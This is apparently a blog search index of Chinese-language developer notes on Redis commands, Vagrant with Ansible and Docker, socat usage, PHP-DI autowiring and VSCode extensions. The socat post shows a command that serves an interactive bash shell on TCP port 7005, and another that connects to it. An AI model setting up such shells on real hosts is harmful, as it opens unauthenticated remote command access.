rpop\n\n同上，是右邊\n\n#### llen\n\nllen list(key)\n\n#### lrem\n\nlrem list(key) count value \n\n> 根據參數 count 的值，移除列表中與參數 value 相等的元素。\n> count 的值可以是以下幾種：\n>     count > 0 : 從表頭開始向表尾搜索，移除與 value 相等的元素，數量為 count 。\n>     count < 0 : 從表尾開始向表頭搜索，移除與 value 相等的元素，數量為 count 的絕對值。\n>     count = 0 : 移除表中所有與 value 相等的值。\n\n\n[LREM key count value — Redis 命令参考](http://redisdoc.com/list/lrem.html)\n\n#### lrange\n\n\n> 返回列表 key 中指定區間內的元素，區間以偏移量 start 和 stop 指定。\n> \n> 下標(index)參數 start 和 stop 都以 0 為底，也就是說，以 0 表示列表的第一個元素，以 1 表示列表的第二個元素，以此類推。\n> \n> 你也可以使用負數下標，以 -1 表示列表的最後一個元素， -2 表示列表的倒數第二個元素，以此類推。\n\n[LRANGE key start stop — Redis 命令參考](http://redisdoc.com/list/lrange.html)\n\n#### lindex\n\nlindex key index\n回傳 list 的位置 value值\n\n#### brpop\n\n阻塞 rpop\n\n#### brpush\n\n阻塞 rpush\n\n#### 總整理\n\n新增: rpush lpush linsert\n查詢: lrange lindex llen\n刪除: lpop rpop lrem ltrim\n修改: lset\n阻塞動作: blpop brpop\n\nMessage Queue 消息對列 是用 lpush,brpop\n但跟 lpush ,rpop 不能做嗎?\n後來發現 rpop 不會阻塞\n在這邊程式用 while 迴圈 CPU 一定會爆表(吃很多資源)\n\n###  Set\n\n#### sset\n\nsset key element ...\n\n#### srem \n\nsrem key element \n\n#### scard\n\n算出 set 個數\n\n#### sismember\n\nset is member ?\n\n判斷 set 裡面有沒有 指定的值\n\n#### spop\n\n移除一個 set 的值\n\n回傳移除的值\n\n#### srandmember\n\nsrandmember key [count]\n\n隨機回傳 set 的 member(資料)\n\n#### smember\n\nsmember key\n\n回傳 set 所有值(member)\n\nPS: smembers 和 lrange,hgetall 都會造成阻塞可能性。通常會用 sscan 替代\n\n#### set 運算集\n\n##### sinter (交集)\n\nsinter key [key ...]\n\n##### sunion (聯集)\n\nsunion key [key ...]\n\n##### sdiff (差集)\n\nsdiff key [key ...]\n\n##### 集合存在...\n\nsinterstore destination key [key ...]\nsunionstore destination key [key ...]\nsdiffstore destination key [key ...]\n\n### sorted set\n\n#### zadd\n\nsadd key [option] score member [score member ...]\n\n**option**\nnx: member 必須不存在\nxx: member 必須存在\nCH：修改從加入新的元素，以改變元件的總數（CH是改變的縮寫）的數目的返回值. 更改的元素是添加的新元素以及已為其更新分數的現有元素. 因此，命令行中指定的具有與過去相同分數的元素將不計算在內. 注意：通常， ZADD的返回值僅計算添加的新元素的數量.**這個還不是很懂**\n[ZADD – Redis 中文文檔教程](https://s0redis0io.icopy.site/commands/zadd)\nINCR: 數值累加\n\n#### zcard \n\n查詢 zset 個數\n\n#### zsocre\n\n這個很重要。沒有 zget\nzscore key member\n得到設定分數\n\n\n#### 排名\n##### zrank \n\nzrank key member\n\n查詢 member 排名\n由小到大\n\n##### zrevrank\n\nzrevrank 排名(倒敘)\n由大到小\n\n#### zrem\n\nzrem key member [member ...]\n\n刪除 member\n\n#### zincrby \n\nzincrby key increment member\n\n給 member 增加 score\n\n#### zrange,zrevrange\n\n由小到大\nzrange key start end [withscores]\n由大到小\nzrevrange key start end [withscores]\n\nex: zrange zset 0 100\n\nwithscores 是同時返回 score 分數\n\n#### zrangebyscore, zrevrangebyscore\n\nzrangebyscore key min max [withscores] [limit offset count]\n\nzrevrangebyscore key min max [withscores] [limit offset count]\n\n指定範圍返回 member\n\n-inf,+inf => 無限小,無限大\n小括號 `(` 大於\nex: zrangebyscore user:rank (200 +inf withscores\n\n#### zcount\n\nzcount key min max \n\n抓取分數區間的 member 個數\n\n#### zremrangebyrank , zremrangebyscore\n\nzremrangebyrank key start end\n\n刪除 rank 排名(0開始)\n\nex: zremrangebyrank user:rank 0 3\n\nzremrangebyscore key min max\n\nzremrangebyscore user:rank (250 +inf\n\n#### 集運算\n\n交集\nzinterstore destination numkeys key [key ...] [weights weight [weight ...]] [aggregate sum|min|max]\n\nweight 權重\naggregate 交集後做的 score 動作。預設是 sum\n\n并集\n\nzunionstore destination numkeys key [key ...] [weights weight [weight ...]] [aggregate sum|min|max]\n\n\n#### zset 小結論\n\nset 跟 zset 指令差非常多\n一般常用在 排行榜上面\n\n\n##### 有在思考資料會一直存在 redis ?\n\n經過 Google 一翻，正常會把資料回傳到 MySQL\n- [PHP+Redis 实例【一】点赞 + 热度 上篇 - H-大叔 - 博客园](https://www.cnblogs.com/sunshine-H/p/7922285.html)\n- [PHP+Redis 实例【一】点赞 + 热度 下篇 - H-大叔 - 博客园](https://www.cnblogs.com/sunshine-H/p/7928034.html)\n\n更多文章\n- [使用MySQL、Redis解决排行榜问题 - 簡書](https://www.jianshu.com/p/8060708a5b46)\n- [千万用户排名设计 - 知乎](https://zhuanlan.zhihu.com/p/50770947)\n- [云风的 BLOG: 谈谈陌陌争霸在数据库方面踩过的坑(排行榜篇)](https://blog.codingnow.com/2014/03/mmzb_db_2.html)\n\n## 搜尋一些\n\n### redis 學習路線\n\n網路上找到的圖\n\n{% asset_img redis.png Redis學習路線 %}\n\n### 一些找網路文章\n\n- [Redis 应用场景汇总 | LearnKu 终身编程者的知识社区](https://learnku.com/articles/33421)\n- [php - redis使用list做消息队列,为什么推送用lpush,而消费用的是brpop? - SegmentFault 思否](https://segmentfault.com/q/1010000010777585)\n- [redis专题16 数据持久化实践 | 一线攻城狮](https://researchlab.github.io/2018/10/13/redis-16-storage-solution-opt/)\n- [Redis SCAN的使用 - 静中细思的博客 | Kingnet Blog](http://jinguoxing.github.io/redis/2018/09/04/redis-scan/)\n- [阿里云Redis开发规范-云栖社区-阿里云](https://yq.aliyun.com/articles/531067)\n- [Jedis常见异常汇总-云栖社区-阿里云](https://yq.aliyun.com/articles/236384?spm=a2c4e.11153940.0.0.fdaf2d39jbvGgk)","tags":["redis"],"categories":["Redis"]},{"title":"vagrant 搭配使用 ansible 和 docker 架設 redis 小記","url":"%2Fblog%2F2020%2F02%2F15%2Fvagrant-%E6%90%AD%E9%85%8D%E4%BD%BF%E7%94%A8-ansible-%E5%92%8C-docker-%E6%9E%B6%E8%A8%AD-redis-%E5%B0%8F%E8%A8%98%2F","content":"\n常常我們需要做布署安裝\n多台可能需要\n最近看到 vagrant 可以搭配 ansible 使用\n網路上隨便找一個範例小記\n意外發現 `/var/run` 一些程式設定方法\n\n<!--more-->\n\n## vagrant 使用 ansible 安裝 redis\n\n[mikeblum/redis-playbook: Ansible playbook for deploying, securing, and optimizing a Redis instance](https://github.com/mikeblum/redis-playbook)\n\n```bash\ngit clone https://github.com/mikeblum/redis-playbook.git\ncd redis-playbook\n# image 可以改成用過的\nvagrant up\n```\n\n這時候 redis 都是可以用的\n但我發現 vagrant reload 重開機後\nredis 竟然開不起來\n\n### /var/run 引發 redis 無法啟動\n\n`/var/run` 裡面的 redis 重開機竟然就不見了\n經過 Google 發現由於 ubuntu 預設 /var/run 是用 tmpfs\n所以重開機資料就不會在\n\n但我發現裡面有 docker ,mysqld...，權限也不是 root\n這又是從哪裡來的呢?\n\n後來追查發現 `/etc/init/` 裡面 docker.conf 和 mysql.conf 有做產生檔案改權限相關動作\n\n> 題外話不過那 `/var/log` 是怎麼改的?\n> 這也是不錯的問題\n\n但是我嘗試使用 apt install redis \n發現 /etc/init 沒有我要的\n後來發現 /etc/init.d/ 裡面有相關 redis 設定\n\n```bash\n###########################\n#chkconfig: 2345 10 90\n#description: Start and Stop redis\nPATH=/usr/local/bin:/sbin:/usr/bin:/bin\n \nREDISPORT=6379\nEXEC=/usr/local/bin/redis-server\nREDIS_CLI=/usr/local/bin/redis-cli\n##判断redis是否启动了\nPIDFILE=/var/run/redis_6379.pid\nCONF=\"/etc/redis.conf\"\nPASSWORD=$(cat $CONF|grep '^\\s*requirepass'|awk '{print $2}'|sed 's/\"//g')\n \ncase \"$1\" in\n    start)\n        if [ -f $PIDFILE ]\n        then\n                echo \"$PIDFILE exists, process is already running or crashed\"\n        else\n                echo \"Starting Redis server...\"\n                $EXEC $CONF\n        fi\n        if [ \"$?\"=\"0\" ]\n        then\n              echo \"Redis is running...\"\n        fi\n        ;;\n    stop)\n        if [ ! -f $PIDFILE ]\n        then\n                echo \"$PIDFILE does not exist, process is not running\"\n        else\n                PID=$(cat $PIDFILE)\n                echo \"Stopping ...\"\nif [ -z $PASSWORD ]\nthen\n    $REDIS_CLI -p $REDISPORT shutdown\nelse\n    $REDIS_CLI -a $PASSWORD -p $REDISPORT shutdown\nfi\n                #$REDIS_CLI -p $REDISPORT SHUTDOWN\n                while [ -x ${PIDFILE} ]\n               do\n                    echo \"Waiting for Redis to shutdown ...\"\n                    sleep 1\n                done\n                echo \"Redis stopped\"\n        fi\n        ;;\n   restart|force-reload)\n        ${0} stop\n        ${0} start\n        ;;\n  *)\n    echo \"Usage: /etc/init.d/redis {start|stop|restart|force-reload}\" >&2\n        exit 1\nesac\n##############################\n```\n我懶得從 VM 搬出來，參考[Redis在Linux上的安装及相关配置 - 知乎](https://zhuanlan.zhihu.com/p/73464692)\n\n但就沒有專門給 systemctl 設定用的嗎?\n\n還是有找到方法，但很多都沒有提到\n是不是大部分 /var/run 沒有掛載到 tmpfs 上面??\n```\n[Unit]\nDescription=Redis In-Memory Data Store\nAfter=network.target\n\n[Service]\nPermissionsStartOnly=true\nExecStartPre=-/bin/mkdir -p /var/run/redis\nExecStartPre=-/bin/chown redis.redis /var/run/redis\n#PIDFile=/var/run/redis_6379.pid  發現沒用也\nUser=redis\nGroup=redis\nExecStart=/usr/local/bin/redis-server /etc/redis/redis.conf\nExecStop=/usr/local/bin/redis-cli shutdown\nRestart=always\n\n\n[Install]\nWantedBy=multi-user.target\n```\n\n上面 PIDFile 好像沒加也能正常跑( 可以看 /etc/redis/redis.conf 的 pidfile )\n主要上 `/var/run/redis` 資料夾需要建立，並且權限給 redis:redis\n\n不過這個算是最佳解嗎?\n我在這篇[/var/run/redis_2323 directory cannot be created in systemd service · Issue #132 · DavidWittman/ansible-redis](https://github.com/DavidWittman/ansible-redis/issues/132)看到\n最後解決方案[Merge pull request #135 from DavidWittman/132-systemd-tmpfiles · DavidWittman/ansible-redis@9937b2e](https://github.com/DavidWittman/ansible-redis/commit/9937b2e5ec8c371f77f384b8252049e3344ffce7)使用 `/etc/tmpfiles.d`\n不過我看我現在 linux 系統沒有這個目錄\n\n### /etc/tempfiles.d 最佳解法\n\n[systemd (正體中文) - ArchWiki](https://wiki.archlinux.org/index.php/Systemd_(%E6%AD%A3%E9%AB%94%E4%B8%AD%E6%96%87)#%E8%87%A8%E6%99%82%E6%AA%94%E6%A1%88)\n\n> /usr/lib/tmpfiles.d/ 和 /etc/tmpfiles.d/ 中的檔案描述了 systemd-tmpfiles 如何創建、清理、删除臨時檔案和目錄，這些檔案和目錄通常存放在 /run 和 /tmp 中。設定檔名稱為 /etc/tmpfiles.d/<program>.conf。此處的配置能覆蓋 /usr/lib/tmpfiles.d/目錄中的同名配置。\n> 臨時檔案通常和服務檔案同时提供，以生成守護程序需要的檔案和目錄。例如 Samba 服務需要目錄 /run/samba 存在並設置正確的權限位\n\n[Ubuntu 16.04 \b在 reboot 後保留 tmp 內的檔案 | Mr. 沙先生](https://shazi.info/ubuntu-14-04-16-04-%E5%9C%A8-reboot-%E5%BE%8C%E4%BF%9D%E7%95%99-tmp-%E5%85%A7%E7%9A%84%E6%AA%94%E6%A1%88/)\n\n我 Elementary OS 裡面 `/etc/tmpfiles.d/` 沒有任何東西，`/usr/lib/tmpfiles.d/` 底下有\n不過正常應該是可以用的\n\n只要在 playbook.yml 下面加\n\n```yml\n    - name: create systemd tmpfiles configuration\n      template: src=templates/tmpfiles_redis.conf.j2\n                dest=/etc/tmpfiles.d/redis.conf\n                mode=0644 \n```\n\ntemplates/tmpfiles_redis.conf.j2\n```\nd {{ redis_socket|dirname }} 0755 {{ redis_user }} {{ redis_group }}\n```\n\n就可以正常了\n\n### 小結\n\n我使用這個 playbook 不是非常完整\n但他是我第一個網路上找到可以跑的 playbook\n而且配置上還滿清楚的\n\n比較多完整配置可以用[DavidWittman/ansible-redis: Highly-configurable Ansible role to install Redis and Redis Sentinel from source](https://github.com/DavidWittman/ansible-redis)\n\n## linux install 指令\n\n[install command in Linux with examples - GeeksforGeeks](https://www.geeksforgeeks.org/install-command-in-linux-with-examples/)\n\n簡單來說 可以複製檔案並且設定權限\n這是我從 /etc/init/mysql.conf 看到\n由於上面我花了一堆時間，這個就先跳過...\n\n## vagrant 搭配 docker\n\n參考[使用Vagrant跟Docker快速建構開發與測試環境 « Sam的程式筆記](http://samchu.logdown.com/posts/288889-docker-fast-with-vagrant-and-construct-development-and-test-environments)\n\n\n執行結果\n```\nBringing machine 'elasticsearch' up with 'docker' provider...\nBringing machine 'postgres' up with 'docker' provider...\n==> elasticsearch: Pruning invalid NFS exports. Administrator privileges will be required...\n[sudo] password for malagege:     \n==> elasticsearch: Creating the container...\n    elasticsearch:   Name: elasticsearch\n    elasticsearch:  Image: elasticsearch\n    elasticsearch:   Port: 9200:9200\n    elasticsearch:   Port: 9300:9300\nA Docker command executed by Vagrant didn't complete successfully!\nThe command run along with the output from the command is shown\nbelow.\n\nCommand: [\"docker\", \"run\", \"--name\", \"elasticsearch\", \"-d\", \"-p\", \"9200:9200\", \"-p\", \"9300:9300\", \"elasticsearch\", {:notify=>[:stdout, :stderr]}]\n\nStderr: Unable to find image 'elasticsearch:latest' locally\n/usr/bin/docker: Error response from daemon: manifest for elasticsearch:latest not found: manifest unknown: manifest unknown.\nSee '/usr/bin/docker run --help'.\n```\n\n感覺電腦外層要裝 docker\n~~NFS 掛載你的 docker unix socket 到裡面開 docker container~~\n他就只是在 docker 開啟 container...\n不過這樣有什麼好處... 還在想\n\n所以不能直接`vagrant ssh`\n需要使用 `vagrant docker-*` 相關指令\n[drupal - Vagrant ssh to Docker container - Stack Overflow](https://stackoverflow.com/questions/37191371/vagrant-ssh-to-docker-container)\n\n當初以為這是在 VM 裝 docker，直接抓 image 開啟 container\n但跟我想的不一樣\n\n老實說這有什麼好處，我想可能用 docker-compose 會比較快吧...\n但意外發現載入速度滿快的!!!(這不是廢話)\n\n### vagrant ssh 登入 container\n\n參考: [如何配置 Vagrant SSH 在 Docker Provider - iWonder Blog](http://blog.iwonder.tw/2017/08/20/vagrant-ssh-docker/)\n有找到如何使用 vagrant ssh 進去\n\ndockerfile\n```dockerfile\n# Pull base image\nFROM ubuntu:16.04\n# Installation\nRUN apt-get update\nRUN apt-get install -y openssh-server sudo\n# Create vagrant user with sudo privilege\nRUN useradd -m -d /home/vagrant -s /bin/bash vagrant\nRUN echo 'vagrant:vagrant' | chpasswd\nRUN echo 'vagrant ALL=(ALL) NOPASSWD:ALL' > /etc/sudoers.d/vagrant\nRUN chmod 440 /etc/sudoers.d/vagrant\n# Run SSH service\nRUN mkdir /var/run/sshd\nEXPOSE 22\nCMD [\"/usr/sbin/sshd\", \"-D\"]\n```\n\nVagrantfile\n```ruby\n# Vagrantfile\n# -*- mode: ruby -*-\nVagrant.configure(\"2\") do |config|\n  config.vm.provider \"docker\" do |d|\n    d.build_dir = \".\"\n    d.has_ssh = true\n  end\n  config.ssh.password = 'vagrant'\nend\n```\n\n或\n\nVagrantfile\n```ruby\n# Vagrantfile\n# -*- mode: ruby -*-\nVagrant.configure(\"2\") do |config|\n  config.vm.provider \"docker\" do |d|\n    d.image = \"wonderchang/baseimage-ssh\"\n    d.has_ssh = true\n  end\n  config.ssh.password = 'vagrant'\n  config.vm.network \"forwarded_port\", guest: 80, host: 8080\n  config.vm.provision \"shell\", inline: <<-SHELL\n    apt-get update\n    apt-get install -y nginx\n    service nginx start\n  SHELL\nend\n```\n\nvagrant up 就可以使用，vagrant ssh 就可以使用了\n\n\n### 相關 vagrant 連結\n\n[怎麼找到 \bVagrant box 的 ssh 使用者與密碼 | Mr. 沙先生](https://shazi.info/%E6%80%8E%E9%BA%BC%E6%89%BE%E5%88%B0-vagrant-box-%E7%9A%84-ssh-%E4%BD%BF%E7%94%A8%E8%80%85%E8%88%87%E5%AF%86%E7%A2%BC/)\n[Vagrant 學習筆記 - VagrantPi Blog](https://vagrantpi.github.io/2018/02/11/vagrant/)\n\n\nUsing default tag: latest\nError response from daemon: manifest for elasticsearch:latest not found: manifest unknown: manifest unknown\n\ndocker pull elasticsearch:6.5.0\n[Elasticsearch latest not available · Issue #215 · elastic/elasticsearch-docker](https://github.com/elastic/elasticsearch-docker/issues/215)\n\n[如何配置 Vagrant SSH 在 Docker Provider - iWonder Blog](http://blog.iwonder.tw/2017/08/20/vagrant-ssh-docker/)\n\n\n\n[Ansible install and introduction | SAM的程式筆記](https://blog.samchu.dev/2019/07/05/Ansible-install-and-introduction/)","tags":["ansible"],"categories":["Vagrant"]},{"title":"socat 實用網路工具 和 使用解析 unix socket 方法","url":"%2Fblog%2F2020%2F02%2F14%2Fsocat-%E5%AF%A6%E7%94%A8%E7%B6%B2%E8%B7%AF%E5%B7%A5%E5%85%B7-%E5%92%8C-%E4%BD%BF%E7%94%A8%E8%A7%A3%E6%9E%90-unix-socket-%E6%96%B9%E6%B3%95%2F","content":"\n最近要看 unix socket 傳送資料而苦惱\n剛好最近這個工具[通过tcpdump对Unix Domain Socket 进行抓包解析 | plantegg](https://plantegg.github.io/2018/01/01/%E9%80%9A%E8%BF%87tcpdump%E5%AF%B9Unix%20Socket%20%E8%BF%9B%E8%A1%8C%E6%8A%93%E5%8C%85%E8%A7%A3%E6%9E%90/)\n[就是要你懂Unix Socket 进行抓包解析 | plantegg](https://plantegg.github.io/2019/04/04/%E5%B0%B1%E6%98%AF%E8%A6%81%E4%BD%A0%E6%87%82%E6%8A%93%E5%8C%85--Unix-Socket%E6%8A%93%E5%8C%85/)\n馬上實作看看!!!\n\n<!--more-->\n\n## 簡單介紹\n\n**So**cket **cat** 是一個比 netcat(nc) 強大工具。 nc 我沒怎麼使用過，不過直接先跳學 socat 使用好像也不錯，感覺比 nc 簡單。\n\n\n## 首先怎麼抓到 unix socket \n\n```bash\nsudo mv /var/run/docker.sock /var/run/docker.sock.original\nsudo socat TCP-LISTEN:8089,reuseaddr,fork UNIX-CONNECT:/var/run/docker.sock.original\nsudo socat UNIX-LISTEN:/var/run/docker.sock,fork TCP-CONNECT:127.0.0.1:8089\n```\n\n**以下是我想的流程，未必正確**\n上方實作 socket ，正常流程\n\n1. socket server 會做 等待接收資料(stdin)\nclient端: clinet socket (stdin) ---> server socket (對 client 來說是 stdout,server 來說是 stdin)\n\n2. Server接到完資料，經過程式處理，會回傳資料到client\nServer端: server socket (stdin) ---> client socket (對 server 來說是 stdout,client 來說是 stdin)\n\n所以正常應該會有來回資料\n\n用上面方法，我發現 docker 怎麼沒有 docker 容器跑出來結果`docker run ubuntu echo hello`\n經過一番測試\n\n```\nsudo mv /var/run/docker.sock /var/run/docker.sock.original\nsudo socat -t100 -d -x -v UNIX-LISTEN:/var/run/docker.sock,mode=777,reuseaddr,fork UNIX-CONNECT:/var/run/docker.sock.original\n```\n用以上參數可以正常看到執行結果，又在想他有做轉發應該都會來回，應該可以做顯示\n發現多了`-t100 -d -x -v`可以顯示結果\n```\nsudo mv /var/run/docker.sock /var/run/docker.sock.original\nsudo socat -t100 -d -x -v TCP-LISTEN:8089,reuseaddr,fork UNIX-CONNECT:/var/run/docker.sock.original\nsudo socat -t100 -d -x -v UNIX-LISTEN:/var/run/docker.sock,fork TCP-CONNECT:127.0.0.1:8089\n```\n這樣就正常了\n\n`-t<timeout>`\n沒想到是跟這個有關係，設定-t100 就能顯示\n> When one channel has reached EOF, the write part of the other channel is shut down. Then, socat waits <timeout> [timeval] seconds before terminating.  Default  is  0.5  seconds.\n> This  timeout only applies to addresses where write and read part can be closed independently. When during the timeout interval the read part gives EOF, socat terminates without   awaiting the timeout.\n\n`-v` http 的話可服選擇這種方式去顯示記錄\n`-x` 也是顯示封包格式\n\n## 相關指令\n\n### 讀寫文件\n\n```\nsocat - /xxx/note.txt\nsocat - ./note.txt\n```\n我一直搞不懂 - 意思\n不過 第二個 address 是 STDOUT 突然就好懂了\n不知道`-`是不是呼略的意思?\n\n通常 socat [ option ] address1 address2\n\naddress1->address2\n\n\n### 開 port 通訊\n\n```bash\n# command a window\nsocat TCP-LISTEN:7000 -        \n# command b window\nsocat - TCP:127.0.0.1:7000\n```\n\n### \n\n# 在服務端 7005 端口建立一個 Shell。\n\nserver\n```\n$ socat TCP-LISTEN:7005,fork,reuseaddr EXEC:/bin/bash,pty,stderr\n或者\n$ socat TCP-LISTEN:7005,fork,reuseaddr system:bash,pty,stderr\n```\n\nclient\n\n```\n# 連接到服務器的 7005 端口，即可獲得一個 Shell。readline 是 GNU 的命令行編輯器，具有歷史功能。\n$ socat readline tcp:127.0.0.1:7005\n```\n#### 我的ubuntu 不能用 readline \n\n> 問題: ubuntu下，按照官方文檔，客戶端執行socat readline tcp:serverip:12345，出現錯誤提示：socat[2067] E unknown device/address \"READLINE\"，本機上已經安裝readline相關庫。\n\n### 文件傳送\n\n服務端\n\nsocat -u open:filename,binary tcp-listen:12345\n\n客戶端\n\nsocat -u tcp:serverip:12345 open:localfilename,create,binary\n\n\n\n### 讀寫分離\n\nsocat支持打開端的讀寫分離，使用!!符號，左側表示讀，右側表示寫。\n\nsocat open:hello.html\\!\\!open:log.txt,create,append tcp-listen:12345,reuseaddr,fork\n\n說明\n\nopen:hello.html 表示讀hello.html文件。\nopen:log.txt 表示收到的數據寫入log.txt文件。\nreuseaddr 見socket的SO_REUSEADDR。\nfork 請求到達時，fork一個進程進行處理。\n在bash下，需要用\\對!進行轉義。\n\n參考:[socat - szllq2000 - 博客园](https://www.cnblogs.com/SZLLQ2000/p/8591405.html)\n\n### 通過 OPENSSL 加密傳送\n\n參考: [Socat 入門教程 - 運維之美](https://www.hi-linux.com/posts/61543.html)\n\n```bash\n# 為服務端的證書取一個基本的名字。\nFILENAME=server\n# 生成公鑰私鑰對。\nopenssl genrsa -out $FILENAME.key 1024\n# 生成一個自簽名的證書，會提示你輸入國家代號、姓名等，或者按下回車鍵跳過輸入提示。\nopenssl req -new -key $FILENAME.key -x509 -days 3653 -out $FILENAME.crt\n# 用剛生成的密鑰文件和證書文件來生成PEM文件。\ncat $FILENAME.key $FILENAME.crt >$FILENAME.pem\n```\n\nclient \n```bash\nFILENAME=client\n# 生成公鑰私鑰對。\nopenssl genrsa -out $FILENAME.key 1024\n# 生成一個自簽名的證書，會提示你輸入國家代號、姓名等，或者按下回車鍵跳過輸入提示。\nopenssl req -new -key $FILENAME.key -x509 -days 3653 -out $FILENAME.crt\n# 用剛生成的密鑰文件和證書文件來生成PEM文件。\ncat $FILENAME.key $FILENAME.crt >$FILENAME.pem\n```\n\n### 憑證問題\n\n>  如果出现异常 2016/12/15 17:49:50 socat[8259] E certificate is valid but its commonName does not match hostname\n>  可使用 verify=0 关闭验证\n>  或者添加 commonname\n\n參考: [网络相关工具集](http://wener.me/notes/ops/network/tool/intro/)\n\n## 如何監聽 port 抓 GET POST 封包\n\n### Wireshark\n\n[0. 協定分析 : Wireshark | 宅學習](https://sls.weco.net/CollectiveNote20/Wireshark)\n\nhttp.request.method == \"POST\"\n[wireshark - Sniff HTTP packets for GET and POST requests from an application - Stack Overflow](https://stackoverflow.com/questions/3410505/sniff-http-packets-for-get-and-post-requests-from-an-application)\n\n### tcpdump\n\n過濾 GET 請求:\n\nsudo tcpdump host 3sd.me and port 80 and 'tcp[((tcp[12:1] & 0xf0) >> 2):4] = 0x47455420'\n\n過濾 POST 請求：\n\nsudo tcpdump host 3sd.me and port 80 and 'tcp dst port 80 and (tcp[((tcp[12:1] & 0xf0) >> 2):4] = 0x504f5354)'\n\n參考:\n[使用 wireshark 查看 tcpdump 的抓包結果 - Huang Huang 的博客](https://mozillazg.com/2015/05/open-tcpdump-result-with-wireshark-gui.html)\n[使用 tcpdump 抓取 POST 動作的 request 資料內容 | SSORC.tw](https://ssorc.tw/6553/%E4%BD%BF%E7%94%A8-tcpdump-%E6%8A%93%E5%8F%96-post-%E5%8B%95%E4%BD%9C%E7%9A%84%E5%85%A7%E5%AE%B9/)\n\n\n## 相關教學網站\n\n* [用ssh和socat分分钟搞定Linux各种端口转发 - 知乎](https://zhuanlan.zhihu.com/p/33306055)\n* [TCPDump Capture HTTP GET/POST requests - Apache, Weblogic & Websphere](https://www.middlewareinventory.com/blog/tcpdump-capture-http-get-post-requests-apache-weblogic-websphere/)\n* [SOCAT 简介 - BrieflyX's Base](http://brieflyx.me/2015/linux-tools/socat-introduction/)\n* [Socat 入门教程 - 运维之美](https://www.hi-linux.com/posts/61543.html)\n* [socat - Cindy Sridharan - Medium](https://medium.com/@copyconstruct/socat-29453e9fc8a6)\n* [socat使用笔记 - young525 - 博客园](https://www.cnblogs.com/young525/p/5873727.html)\n* [socat | 夢想家](https://datahunter.org/socat)\n* [依云's Blog](https://blog.lilydjwg.me/tag/socat)\n* [tcpdump 抓包使用小结 | HelloDog](https://wsgzao.github.io/post/tcpdump/)\n\n\n### 查詢到工具\n\ncat、netcat、rinetd、stunnel \n\nFRP\n[推荐一款很好用的内网穿透工具--FRP](https://mp.weixin.qq.com/s/8HeeDC5x5xozElN8GzQLLw)\n\n這篇算沒整理很好\n很多網頁都整理不錯\n大神們真的很厲害\n我只能跪了","tags":["socat"],"categories":["Linux"]},{"title":"PHP-DI 簡單自動注入小記","url":"%2Fblog%2F2020%2F02%2F10%2FPHP-DI-%E7%B0%A1%E5%96%AE%E8%87%AA%E5%8B%95%E6%B3%A8%E5%85%A5%E5%B0%8F%E8%A8%98%2F","content":"\n最近跑去看 PHP-DI \n簡單實作小記\n\n<!--more-->\n\n## 簡單講解\n\n在使用 Spring boot 和 Laravel 上，常常看到自動注入的範例\n很多文章沒有深入講解為什麼可以做自動注入\n\n這段時間我使用到 Spring boot 的 `@autowired` 做自動注入\n明白在框架中有有一個機制在控制你裡面放的需要 `new` 出來的物件\n在使用上可以說\n最近再回頭看 php-di 就突然了解了\n\n更多講解可以看[Laravel 實作小記 | 程式狂想筆記](https://malagege.github.io/blog/2019/07/16/Laravel-%E5%AF%A6%E4%BD%9C%E5%B0%8F%E8%A8%98/#%E6%9C%8D%E5%8B%99%E5%AE%B9%E5%99%A8)\n之前有記錄幾個網站有詳細談到\n\n\n## 自動注入\n\n```php\n<?php\ninclude './vendor/autoload.php';\n\n# 第 1 步: 建立 DI container\n$builder = new \\DI\\ContainerBuilder();\n$container = $builder->build();\n\n# 第 2 步: 建立 class \n$a = $container->get('A');\n\nvar_dump($a);\n\n# 第 3 步: 建立 DI 實作 class，B class 不需要做 new 動作\nclass A{\n    private $_b;\n    function __construct(B $b)\n    {\n        $this->_b = $b;\n        // $b->hello();\n    }\n}\n\nclass B{\n    function __construct()\n    {\n        echo \"Hello World! B\";\n    }\n    function hello()\n    {\n        echo \"B:say hello\";\n    }\n}\n\n\n```\n\n## autowiring 出來都是單例模式\n\n```php\n<?php\ninclude './vendor/autoload.php';\n\n\n$builder = new \\DI\\ContainerBuilder();\n$container = $builder->build();\n\n\n$a = $container->get('A');\n$a_b = $a->get_B();\n$b = $container->get('B');\nvar_dump($a_b === $b); # true\n\nclass A{\n    private $_b;\n    function __construct(B $b)\n    {\n        $this->_b = $b;\n        // $b->hello();\n    }\n\n    function get_B()\n    {\n        return $this->_b;\n    }\n}\n\nclass B{\n    function __construct()\n    {\n        echo \"Hello World! B\";\n    }\n    function hello()\n    {\n        echo \"B:say hello\";\n    }\n}\n\n\n```\n\nBTW: [Spring IOC 单例和多例 - 简书](https://www.jianshu.com/p/6f0b148d698b)\n[hailindai/SSMSample](https://github.com/hailindai/SSMSample)\n\n","tags":["di"],"categories":["PHP"]},{"title":"VScode,Sublime 使用套件整理","url":"%2Fblog%2F2020%2F02%2F09%2FVScode-Sublime-%E4%BD%BF%E7%94%A8%E5%A5%97%E4%BB%B6%E6%95%B4%E7%90%86%2F","content":"\n整理使用過\n\n<!--more-->\n\n計畫會依照一年去做\n\n> UNIX:\n> \n> code --list-extensions | xargs -L 1 echo code --install-extension\n>\n> Windows (PowerShell, e. g. using VSCode's integrated Terminal):\n> \n> code --list-extensions | % { \"code --install-extension $_\" }\n\n[How can you export VS Code extension list - Stack Overflow](https://stackoverflow.com/questions/35773299/how-can-you-export-vs-code-extension-list)\n\nSublime 查詢 package list方法\n\npreferences->Browser Package\n\nls 列出來\n\n# VScode 和 sublime 套件\n\n## 2020\n\n### VScode\n\n#### 公司\n\ncode --install-extension alexdima.copy-relative-path\ncode --install-extension beaugust.blamer-vs\ncode --install-extension bierner.emojisense\ncode --install-extension bierner.markdown-checkbox\ncode --install-extension bierner.markdown-emoji\ncode --install-extension bierner.markdown-footnotes\ncode --install-extension bierner.markdown-image-size\ncode --install-extension bierner.markdown-preview-github-styles\ncode --install-extension bmewburn.vscode-intelephense-client\ncode --install-extension christian-kohler.path-intellisense\ncode --install-extension dbaeumer.vscode-eslint\ncode --install-extension donjayamanne.githistory\ncode --install-extension DotJoshJohnson.xml\ncode --install-extension dushaobindoudou.translation\ncode --install-extension eamodio.gitlens\ncode --install-extension EditorConfig.EditorConfig\ncode --install-extension eg2.tslint\ncode --install-extension espresso3389.unixtime-converter\ncode --install-extension felixfbecker.php-intellisense\ncode --install-extension formulahendry.auto-close-tag\ncode --install-extension formulahendry.auto-rename-tag\ncode --install-extension formulahendry.code-runner\ncode --install-extension fskorzec.shadow-align\ncode --install-extension GrapeCity.gc-excelviewer\ncode --install-extension HackMD.vscode-hackmd\ncode --install-extension huizhou.githd\ncode --install-extension humao.rest-client\ncode --install-extension 